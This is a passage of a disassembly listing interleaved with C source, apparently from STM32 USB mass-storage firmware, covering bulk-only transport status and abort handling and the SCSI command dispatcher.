 80096bc:	687b      	ldr	r3, [r7, #4]
 80096be:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096c2:	687b      	ldr	r3, [r7, #4]
 80096c4:	32b0      	adds	r2, #176	; 0xb0
 80096c6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096ca:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80096cc:	68fb      	ldr	r3, [r7, #12]
 80096ce:	2b00      	cmp	r3, #0
 80096d0:	d024      	beq.n	800971c <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 80096d2:	68fb      	ldr	r3, [r7, #12]
 80096d4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096d8:	461a      	mov	r2, r3
 80096da:	4b12      	ldr	r3, [pc, #72]	; (8009724 <MSC_BOT_SendCSW+0x74>)
 80096dc:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 80096de:	68fb      	ldr	r3, [r7, #12]
 80096e0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096e4:	461a      	mov	r2, r3
 80096e6:	78fb      	ldrb	r3, [r7, #3]
 80096e8:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 80096ec:	68fb      	ldr	r3, [r7, #12]
 80096ee:	2200      	movs	r2, #0
 80096f0:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 80096f2:	4b0d      	ldr	r3, [pc, #52]	; (8009728 <MSC_BOT_SendCSW+0x78>)
 80096f4:	7819      	ldrb	r1, [r3, #0]
 80096f6:	68fb      	ldr	r3, [r7, #12]
 80096f8:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 80096fc:	3210      	adds	r2, #16
 80096fe:	230d      	movs	r3, #13
 8009700:	6878      	ldr	r0, [r7, #4]
 8009702:	f003 fbb1 	bl	800ce68 <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009706:	4b09      	ldr	r3, [pc, #36]	; (800972c <MSC_BOT_SendCSW+0x7c>)
 8009708:	7819      	ldrb	r1, [r3, #0]
 800970a:	68fb      	ldr	r3, [r7, #12]
 800970c:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009710:	3210      	adds	r2, #16
 8009712:	231f      	movs	r3, #31
 8009714:	6878      	ldr	r0, [r7, #4]
 8009716:	f003 fbdf 	bl	800ced8 <USBD_LL_PrepareReceive>
 800971a:	e000      	b.n	800971e <MSC_BOT_SendCSW+0x6e>
    return;
 800971c:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800971e:	3710      	adds	r7, #16
 8009720:	46bd      	mov	sp, r7
 8009722:	bd80      	pop	{r7, pc}
 8009724:	53425355 	.word	0x53425355
 8009728:	2000010a 	.word	0x2000010a
 800972c:	2000010b 	.word	0x2000010b

08009730 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 8009730:	b580      	push	{r7, lr}
 8009732:	b084      	sub	sp, #16
 8009734:	af00      	add	r7, sp, #0
 8009736:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009738:	687b      	ldr	r3, [r7, #4]
 800973a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800973e:	687b      	ldr	r3, [r7, #4]
 8009740:	32b0      	adds	r2, #176	; 0xb0
 8009742:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009746:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009748:	68fb      	ldr	r3, [r7, #12]
 800974a:	2b00      	cmp	r3, #0
 800974c:	d02c      	beq.n	80097a8 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 800974e:	68fb      	ldr	r3, [r7, #12]
 8009750:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009754:	7f1b      	ldrb	r3, [r3, #28]
 8009756:	2b00      	cmp	r3, #0
 8009758:	d10f      	bne.n	800977a <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 800975a:	68fb      	ldr	r3, [r7, #12]
 800975c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009760:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 8009762:	2b00      	cmp	r3, #0
 8009764:	d009      	beq.n	800977a <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 8009766:	68fb      	ldr	r3, [r7, #12]
 8009768:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 800976a:	2b00      	cmp	r3, #0
 800976c:	d105      	bne.n	800977a <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800976e:	4b10      	ldr	r3, [pc, #64]	; (80097b0 <MSC_BOT_Abort+0x80>)
 8009770:	781b      	ldrb	r3, [r3, #0]
 8009772:	4619      	mov	r1, r3
 8009774:	6878      	ldr	r0, [r7, #4]
 8009776:	f003 faa7 	bl	800ccc8 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800977a:	4b0e      	ldr	r3, [pc, #56]	; (80097b4 <MSC_BOT_Abort+0x84>)
 800977c:	781b      	ldrb	r3, [r3, #0]
 800977e:	4619      	mov	r1, r3
 8009780:	6878      	ldr	r0, [r7, #4]
 8009782:	f003 faa1 	bl	800ccc8 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 8009786:	68fb      	ldr	r3, [r7, #12]
 8009788:	7a5b      	ldrb	r3, [r3, #9]
 800978a:	2b02      	cmp	r3, #2
 800978c:	d10d      	bne.n	80097aa <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800978e:	4b09      	ldr	r3, [pc, #36]	; (80097b4 <MSC_BOT_Abort+0x84>)
 8009790:	781b      	ldrb	r3, [r3, #0]
 8009792:	4619      	mov	r1, r3
 8009794:	6878      	ldr	r0, [r7, #4]
 8009796:	f003 fa97 	bl	800ccc8 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800979a:	4b05      	ldr	r3, [pc, #20]	; (80097b0 <MSC_BOT_Abort+0x80>)
 800979c:	781b      	ldrb	r3, [r3, #0]
 800979e:	4619      	mov	r1, r3
 80097a0:	6878      	ldr	r0, [r7, #4]
 80097a2:	f003 fa91 	bl	800ccc8 <USBD_LL_StallEP>
 80097a6:	e000      	b.n	80097aa <MSC_BOT_Abort+0x7a>
    return;
 80097a8:	bf00      	nop
  }
}
 80097aa:	3710      	adds	r7, #16
 80097ac:	46bd      	mov	sp, r7
 80097ae:	bd80      	pop	{r7, pc}
 80097b0:	2000010b 	.word	0x2000010b
 80097b4:	2000010a 	.word	0x2000010a

080097b8 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80097b8:	b580      	push	{r7, lr}
 80097ba:	b084      	sub	sp, #16
 80097bc:	af00      	add	r7, sp, #0
 80097be:	6078      	str	r0, [r7, #4]
 80097c0:	460b      	mov	r3, r1
 80097c2:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80097c4:	687b      	ldr	r3, [r7, #4]
 80097c6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80097ca:	687b      	ldr	r3, [r7, #4]
 80097cc:	32b0      	adds	r2, #176	; 0xb0
 80097ce:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80097d2:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80097d4:	68fb      	ldr	r3, [r7, #12]
 80097d6:	2b00      	cmp	r3, #0
 80097d8:	d01d      	beq.n	8009816 <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 80097da:	68fb      	ldr	r3, [r7, #12]
 80097dc:	7a5b      	ldrb	r3, [r3, #9]
 80097de:	2b02      	cmp	r3, #2
 80097e0:	d10c      	bne.n	80097fc <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80097e2:	4b10      	ldr	r3, [pc, #64]	; (8009824 <MSC_BOT_CplClrFeature+0x6c>)
 80097e4:	781b      	ldrb	r3, [r3, #0]
 80097e6:	4619      	mov	r1, r3
 80097e8:	6878      	ldr	r0, [r7, #4]
 80097ea:	f003 fa6d 	bl	800ccc8 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80097ee:	4b0e      	ldr	r3, [pc, #56]	; (8009828 <MSC_BOT_CplClrFeature+0x70>)
 80097f0:	781b      	ldrb	r3, [r3, #0]
 80097f2:	4619      	mov	r1, r3
 80097f4:	6878      	ldr	r0, [r7, #4]
 80097f6:	f003 fa67 	bl	800ccc8 <USBD_LL_StallEP>
 80097fa:	e00f      	b.n	800981c <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 80097fc:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8009800:	2b00      	cmp	r3, #0
 8009802:	da0a      	bge.n	800981a <MSC_BOT_CplClrFeature+0x62>
 8009804:	68fb      	ldr	r3, [r7, #12]
 8009806:	7a5b      	ldrb	r3, [r3, #9]
 8009808:	2b01      	cmp	r3, #1
 800980a:	d006      	beq.n	800981a <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 800980c:	2101      	movs	r1, #1
 800980e:	6878      	ldr	r0, [r7, #4]
 8009810:	f7ff ff4e 	bl	80096b0 <MSC_BOT_SendCSW>
 8009814:	e002      	b.n	800981c <MSC_BOT_CplClrFeature+0x64>
    return;
 8009816:	bf00      	nop
 8009818:	e000      	b.n	800981c <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 800981a:	bf00      	nop
  }
}
 800981c:	3710      	adds	r7, #16
 800981e:	46bd      	mov	sp, r7
 8009820:	bd80      	pop	{r7, pc}
 8009822:	bf00      	nop
 8009824:	2000010a 	.word	0x2000010a
 8009828:	2000010b 	.word	0x2000010b

0800982c <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 800982c:	b580      	push	{r7, lr}
 800982e:	b086      	sub	sp, #24
 8009830:	af00      	add	r7, sp, #0
 8009832:	60f8      	str	r0, [r7, #12]
 8009834:	460b      	mov	r3, r1
 8009836:	607a      	str	r2, [r7, #4]
 8009838:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800983a:	68fb      	ldr	r3, [r7, #12]
 800983c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009840:	68fb      	ldr	r3, [r7, #12]
 8009842:	32b0      	adds	r2, #176	; 0xb0
 8009844:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009848:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800984a:	693b      	ldr	r3, [r7, #16]
 800984c:	2b00      	cmp	r3, #0
 800984e:	d102      	bne.n	8009856 <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 8009850:	f04f 33ff 	mov.w	r3, #4294967295
 8009854:	e168      	b.n	8009b28 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 8009856:	687b      	ldr	r3, [r7, #4]
 8009858:	781b      	ldrb	r3, [r3, #0]
 800985a:	2baa      	cmp	r3, #170	; 0xaa
 800985c:	f000 8144 	beq.w	8009ae8 <SCSI_ProcessCmd+0x2bc>
 8009860:	2baa      	cmp	r3, #170	; 0xaa
 8009862:	f300 8153 	bgt.w	8009b0c <SCSI_ProcessCmd+0x2e0>
 8009866:	2ba8      	cmp	r3, #168	; 0xa8
 8009868:	f000 812c 	beq.w	8009ac4 <SCSI_ProcessCmd+0x298>
 800986c:	2ba8      	cmp	r3, #168	; 0xa8
 800986e:	f300 814d 	bgt.w	8009b0c <SCSI_ProcessCmd+0x2e0>
 8009872:	2b5a      	cmp	r3, #90	; 0x5a
 8009874:	f300 80c0 	bgt.w	80099f8 <SCSI_ProcessCmd+0x1cc>
 8009878:	2b00      	cmp	r3, #0
 800987a:	f2c0 8147 	blt.w	8009b0c <SCSI_ProcessCmd+0x2e0>
 800987e:	2b5a      	cmp	r3, #90	; 0x5a
 8009880:	f200 8144 	bhi.w	8009b0c <SCSI_ProcessCmd+0x2e0>
 8009884:	a201      	add	r2, pc, #4	; (adr r2, 800988c <SCSI_ProcessCmd+0x60>)
 8009886:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800988a:	bf00      	nop
 800988c:	080099ff 	.word	0x080099ff
 8009890:	08009b0d 	.word	0x08009b0d
 8009894:	08009b0d 	.word	0x08009b0d
 8009898:	08009a11 	.word	0x08009a11
 800989c:	08009b0d 	.word	0x08009b0d
 80098a0:	08009b0d 	.word	0x08009b0d
 80098a4:	08009b0d 	.word	0x08009b0d
 80098a8:	08009b0d 	.word	0x08009b0d
 80098ac:	08009b0d 	.word	0x08009b0d
 80098b0:	08009b0d 	.word	0x08009b0d
 80098b4:	08009b0d 	.word	0x08009b0d
 80098b8:	08009b0d 	.word	0x08009b0d
 80098bc:	08009b0d 	.word	0x08009b0d
 80098c0:	08009b0d 	.word	0x08009b0d
 80098c4:	08009b0d 	.word	0x08009b0d
 80098c8:	08009b0d 	.word	0x08009b0d
 80098cc:	08009b0d 	.word	0x08009b0d
 80098d0:	08009b0d 	.word	0x08009b0d
 80098d4:	08009a23 	.word	0x08009a23
 80098d8:	08009b0d 	.word	0x08009b0d
 80098dc:	08009b0d 	.word	0x08009b0d
 80098e0:	08009b0d 	.word	0x08009b0d
 80098e4:	08009b0d 	.word	0x08009b0d
 80098e8:	08009b0d 	.word	0x08009b0d
 80098ec:	08009b0d 	.word	0x08009b0d
 80098f0:	08009b0d 	.word	0x08009b0d
 80098f4:	08009a59 	.word	0x08009a59
 80098f8:	08009a35 	.word	0x08009a35
 80098fc:	08009b0d 	.word	0x08009b0d
 8009900:	08009b0d 	.word	0x08009b0d
 8009904:	08009a47 	.word	0x08009a47
 8009908:	08009b0d 	.word	0x08009b0d
 800990c:	08009b0d 	.word	0x08009b0d
 8009910:	08009b0d 	.word	0x08009b0d
 8009914:	08009b0d 	.word	0x08009b0d
 8009918:	08009a7d 	.word	0x08009a7d
 800991c:	08009b0d 	.word	0x08009b0d
 8009920:	08009a8f 	.word	0x08009a8f
 8009924:	08009b0d 	.word	0x08009b0d
 8009928:	08009b0d 	.word	0x08009b0d
 800992c:	08009ab3 	.word	0x08009ab3
 8009930:	08009b0d 	.word	0x08009b0d
 8009934:	08009ad7 	.word	0x08009ad7
 8009938:	08009b0d 	.word	0x08009b0d
 800993c:	08009b0d 	.word	0x08009b0d
 8009940:	08009b0d 	.word	0x08009b0d
 8009944:	08009b0d 	.word	0x08009b0d
 8009948:	08009afb 	.word	0x08009afb
 800994c:	08009b0d 	.word	0x08009b0d
 8009950:	08009b0d 	.word	0x08009b0d
 8009954:	08009b0d 	.word	0x08009b0d
 8009958:	08009b0d 	.word	0x08009b0d
 800995c:	08009b0d 	.word	0x08009b0d
 8009960:	08009b0d 	.word	0x08009b0d
 8009964:	08009b0d 	.word	0x08009b0d
 8009968:	08009b0d 	.word	0x08009b0d
 800996c:	08009b0d 	.word	0x08009b0d
 8009970:	08009b0d 	.word	0x08009b0d
 8009974:	08009b0d 	.word	0x08009b0d
 8009978:	08009b0d 	.word	0x08009b0d
 800997c:	08009b0d 	.word	0x08009b0d
 8009980:	08009b0d 	.word	0x08009b0d
 8009984:	08009b0d 	.word	0x08009b0d
 8009988:	08009b0d 	.word	0x08009b0d
 800998c:	08009b0d 	.word	0x08009b0d
 8009990:	08009b0d 	.word	0x08009b0d
 8009994:	08009b0d 	.word	0x08009b0d
 8009998:	08009b0d 	.word	0x08009b0d
 800999c:	08009b0d 	.word	0x08009b0d
 80099a0:	08009b0d 	.word	0x08009b0d
 80099a4:	08009b0d 	.word	0x08009b0d
 80099a8:	08009b0d 	.word	0x08009b0d
 80099ac:	08009b0d 	.word	0x08009b0d
 80099b0:	08009b0d 	.word	0x08009b0d
 80099b4:	08009b0d 	.word	0x08009b0d
 80099b8:	08009b0d 	.word	0x08009b0d
 80099bc:	08009b0d 	.word	0x08009b0d
 80099c0:	08009b0d 	.word	0x08009b0d
 80099c4:	08009b0d 	.word	0x08009b0d
 80099c8:	08009b0d 	.word	0x08009b0d
 80099cc:	08009b0d 	.word	0x08009b0d
 80099d0:	08009b0d 	.word	0x08009b0d
 80099d4:	08009b0d 	.word	0x08009b0d
 80099d8:	08009b0d 	.word	0x08009b0d
 80099dc:	08009b0d 	.word	0x08009b0d
 80099e0:	08009b0d 	.word	0x08009b0d
 80099e4:	08009b0d 	.word	0x08009b0d
 80099e8:	08009b0d 	.word	0x08009b0d
 80099ec:	08009b0d 	.word	0x08009b0d
 80099f0:	08009b0d 	.word	0x08009b0d
 80099f4:	08009a6b 	.word	0x08009a6b
 80099f8:	2b9e      	cmp	r3, #158	; 0x9e
 80099fa:	d051      	beq.n	8009aa0 <SCSI_ProcessCmd+0x274>
 80099fc:	e086      	b.n	8009b0c <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 80099fe:	7afb      	ldrb	r3, [r7, #11]
 8009a00:	687a      	ldr	r2, [r7, #4]
 8009a02:	4619      	mov	r1, r3
 8009a04:	68f8      	ldr	r0, [r7, #12]
 8009a06:	f000 f893 	bl	8009b30 <SCSI_TestUnitReady>
 8009a0a:	4603      	mov	r3, r0
 8009a0c:	75fb      	strb	r3, [r7, #23]
      break;
 8009a0e:	e089      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009a10:	7afb      	ldrb	r3, [r7, #11]
 8009a12:	687a      	ldr	r2, [r7, #4]
 8009a14:	4619      	mov	r1, r3
 8009a16:	68f8      	ldr	r0, [r7, #12]
 8009a18:	f000 fb9a 	bl	800a150 <SCSI_RequestSense>
 8009a1c:	4603      	mov	r3, r0
 8009a1e:	75fb      	strb	r3, [r7, #23]
      break;
 8009a20:	e080      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 8009a22:	7afb      	ldrb	r3, [r7, #11]
 8009a24:	687a      	ldr	r2, [r7, #4]
 8009a26:	4619      	mov	r1, r3
 8009a28:	68f8      	ldr	r0, [r7, #12]
 8009a2a:	f000 f8df 	bl	8009bec <SCSI_Inquiry>
 8009a2e:	4603      	mov	r3, r0
 8009a30:	75fb      	strb	r3, [r7, #23]
      break;
 8009a32:	e077      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 8009a34:	7afb      	ldrb	r3, [r7, #11]
 8009a36:	687a      	ldr	r2, [r7, #4]
 8009a38:	4619      	mov	r1, r3
 8009a3a:	68f8      	ldr	r0, [r7, #12]
 8009a3c:	f000 fc7e 	bl	800a33c <SCSI_StartStopUnit>
 8009a40:	4603      	mov	r3, r0
 8009a42:	75fb      	strb	r3, [r7, #23]
      break;
 8009a44:	e06e      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 8009a46:	7afb      	ldrb	r3, [r7, #11]
 8009a48:	687a      	ldr	r2, [r7, #4]
 8009a4a:	4619      	mov	r1, r3
 8009a4c:	68f8      	ldr	r0, [r7, #12]
 8009a4e:	f000 fcd2 	bl	800a3f6 <SCSI_AllowPreventRemovable>
 8009a52:	4603      	mov	r3, r0
 8009a54:	75fb      	strb	r3, [r7, #23]
      break;
 8009a56:	e065      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 8009a58:	7afb      	ldrb	r3, [r7, #11]
 8009a5a:	687a      	ldr	r2, [r7, #4]
 8009a5c:	4619      	mov	r1, r3
 8009a5e:	68f8      	ldr	r0, [r7, #12]
 8009a60:	f000 fb16 	bl	800a090 <SCSI_ModeSense6>
 8009a64:	4603      	mov	r3, r0
 8009a66:	75fb      	strb	r3, [r7, #23]
      break;
 8009a68:	e05c      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 8009a6a:	7afb      	ldrb	r3, [r7, #11]
 8009a6c:	687a      	ldr	r2, [r7, #4]
 8009a6e:	4619      	mov	r1, r3
 8009a70:	68f8      	ldr	r0, [r7, #12]
 8009a72:	f000 fb3d 	bl	800a0f0 <SCSI_ModeSense10>
 8009a76:	4603      	mov	r3, r0
 8009a78:	75fb      	strb	r3, [r7, #23]
      break;
 8009a7a:	e053      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 8009a7c:	7afb      	ldrb	r3, [r7, #11]
 8009a7e:	687a      	ldr	r2, [r7, #4]
 8009a80:	4619      	mov	r1, r3
 8009a82:	68f8      	ldr	r0, [r7, #12]
 8009a84:	f000 fa86 	bl	8009f94 <SCSI_ReadFormatCapacity>
 8009a88:	4603      	mov	r3, r0
 8009a8a:	75fb      	strb	r3, [r7, #23]
      break;
 8009a8c:	e04a      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009a8e:	7afb      	ldrb	r3, [r7, #11]
 8009a90:	687a      	ldr	r2, [r7, #4]
 8009a92:	4619      	mov	r1, r3
 8009a94:	68f8      	ldr	r0, [r7, #12]
 8009a96:	f000 f929 	bl	8009cec <SCSI_ReadCapacity10>
 8009a9a:	4603      	mov	r3, r0
 8009a9c:	75fb      	strb	r3, [r7, #23]
      break;
 8009a9e:	e041      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009aa0:	7afb      	ldrb	r3, [r7, #11]
 8009aa2:	687a      	ldr	r2, [r7, #4]
 8009aa4:	4619      	mov	r1, r3
 8009aa6:	68f8      	ldr	r0, [r7, #12]
 8009aa8:	f000 f9af 	bl	8009e0a <SCSI_ReadCapacity16>
 8009aac:	4603      	mov	r3, r0
 8009aae:	75fb      	strb	r3, [r7, #23]
      break;
 8009ab0:	e038      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009ab2:	7afb      	ldrb	r3, [r7, #11]
 8009ab4:	687a      	ldr	r2, [r7, #4]
 8009ab6:	4619      	mov	r1, r3
 8009ab8:	68f8      	ldr	r0, [r7, #12]
 8009aba:	f000 fccd 	bl	800a458 <SCSI_Read10>
 8009abe:	4603      	mov	r3, r0
 8009ac0:	75fb      	strb	r3, [r7, #23]
      break;
 8009ac2:	e02f      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009ac4:	7afb      	ldrb	r3, [r7, #11]
 8009ac6:	687a      	ldr	r2, [r7, #4]
 8009ac8:	4619      	mov	r1, r3
 8009aca:	68f8      	ldr	r0, [r7, #12]
 8009acc:	f000 fd7b 	bl	800a5c6 <SCSI_Read12>
 8009ad0:	4603      	mov	r3, r0
 8009ad2:	75fb      	strb	r3, [r7, #23]
      break;
 8009ad4:	e026      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009ad6:	7afb      	ldrb	r3, [r7, #11]
 8009ad8:	687a      	ldr	r2, [r7, #4]
 8009ada:	4619      	mov	r1, r3
 8009adc:	68f8      	ldr	r0, [r7, #12]
 8009ade:	f000 fe33 	bl	800a748 <SCSI_Write10>
 8009ae2:	4603      	mov	r3, r0
 8009ae4:	75fb      	strb	r3, [r7, #23]
      break;
 8009ae6:	e01d      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009ae8:	7afb      	ldrb	r3, [r7, #11]
 8009aea:	687a      	ldr	r2, [r7, #4]
 8009aec:	4619      	mov	r1, r3
 8009aee:	68f8      	ldr	r0, [r7, #12]
 8009af0:	f000 ff0e 	bl	800a910 <SCSI_Write12>
 8009af4:	4603      	mov	r3, r0
 8009af6:	75fb      	strb	r3, [r7, #23]
      break;
 8009af8:	e014      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009afa:	7afb      	ldrb	r3, [r7, #11]
 8009afc:	687a      	ldr	r2, [r7, #4]
 8009afe:	4619      	mov	r1, r3
 8009b00:	68f8      	ldr	r0, [r7, #12]
 8009b02:	f000 fff9 	bl	800aaf8 <SCSI_Verify10>
 8009b06:	4603      	mov	r3, r0
 8009b08:	75fb      	strb	r3, [r7, #23]
      break;
 8009b0a:	e00b      	b.n	8009b24 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009b0c:	7af9      	ldrb	r1, [r7, #11]
 8009b0e:	2320      	movs	r3, #32
 8009b10:	2205      	movs	r2, #5
 8009b12:	68f8      	ldr	r0, [r7, #12]
 8009b14:	f000 fbb6 	bl	800a284 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009b18:	693b      	ldr	r3, [r7, #16]
 8009b1a:	2202      	movs	r2, #2
 8009b1c:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009b1e:	23ff      	movs	r3, #255	; 0xff
 8009b20:	75fb      	strb	r3, [r7, #23]
      break;
 8009b22:	bf00      	nop
  }

  return ret;
 8009b24:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009b28:	4618      	mov	r0, r3
 8009b2a:	3718      	adds	r7, #24
 8009b2c:	46bd      	mov	sp, r7
 8009b2e:	bd80      	pop	{r7, pc}

08009b30 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009b30:	b580      	push	{r7, lr}
 8009b32:	b086      	sub	sp, #24
 8009b34:	af00      	add	r7, sp, #0
 8009b36:	60f8      	str	r0, [r7, #12]
 8009b38:	460b      	mov	r3, r1
 8009b3a:	607a      	str	r2, [r7, #4]
 8009b3c:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009b3e:	68fb      	ldr	r3, [r7, #12]
 8009b40:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009b44:	68fb      	ldr	r3, [r7, #12]
